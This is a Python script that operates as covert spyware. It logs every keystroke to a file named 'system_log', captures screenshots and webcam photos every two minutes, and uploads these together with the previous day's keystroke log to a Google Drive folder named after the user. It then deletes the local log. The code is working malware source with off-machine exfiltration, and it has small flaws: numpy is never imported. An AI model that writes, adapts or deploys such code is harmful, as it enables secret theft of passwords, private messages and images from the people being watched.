
from io import BytesIO
import getpass
from os import path, remove
from PIL import ImageGrab, Image
from pynput import keyboard
from datetime import datetime, timedelta
import threading
from cv2 import VideoCapture, CAP_DSHOW
from googleDirveUtilities import upload_in_memory_image, get_or_create_folder, upload_text_file


TIMER = 120 #intervals at which screenshots and picture will be taken

file_name = "system_log" + datetime.now().strftime("%Y_%m_%d")

log_file = open(file_name, "a")

FOLDER_NAME = getpass.getuser()

folder_id = get_or_create_folder(FOLDER_NAME)

def on_press(key):
    try:
        # Write the character representation of the key to the file
        log_file.write(key.char)
        log_file.flush()  # Ensure the data is written to the file immediately
    except AttributeError:
        # Handle special keys (like Shift, Ctrl, etc.)
        log_file.write(f' Special key {key} pressed ')
        log_file.flush()

def take_picture (imageName):
    # Open the camera
    
    cap = VideoCapture(0, CAP_DSHOW)

    # Capture a single frame
    ret, frame = cap.read()
    if not ret:
        raise Exception("Failed to capture image")
    
    # Save the image
    upload_in_memory_image(frame, imageName, folder_id)
    
    # Release the camera
    cap.release()

def take_screenshot():
    # Capture the screenshot
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    imageName = f"system_image_{timestamp}.png"
    
    screenshot_array = np.array(ImageGrab.grab())  # NumPy array
    screenshot = Image.fromarray(screenshot_array)  # Convert back to Pillow Image

    screenshot_data = BytesIO()
    screenshot.save(screenshot_data, format='PNG')
    screenshot_data.seek(0)  # Reset the stream position
    upload_in_memory_image(screenshot_data, imageName, folder_id)
    try: 
        take_picture(imageName)
    except Exception as e:
        print(f"Error: {e}")
    
    # Schedule the next screenshot
    try: 
        threading.Timer(120, take_screenshot).start()
    except Exception as e:
        threading.Timer(120, take_screenshot).start()



# Log the start time
start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
log_file.write(f'\nSession started at: {start_time}\n')
log_file.flush()

yesterday_file =  "system_log" + (datetime.now() - timedelta(days=1)).strftime("%Y_%m_%d")
try:
    if  path.exists(yesterday_file):
        upload_text_file(yesterday_file, yesterday_file, folder_id)
        remove(yesterday_file)
except Exception as e:
    print(f"Error: {e}")


try:
    take_screenshot()
except Exception as e:
    print(f"Error: {e}")

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()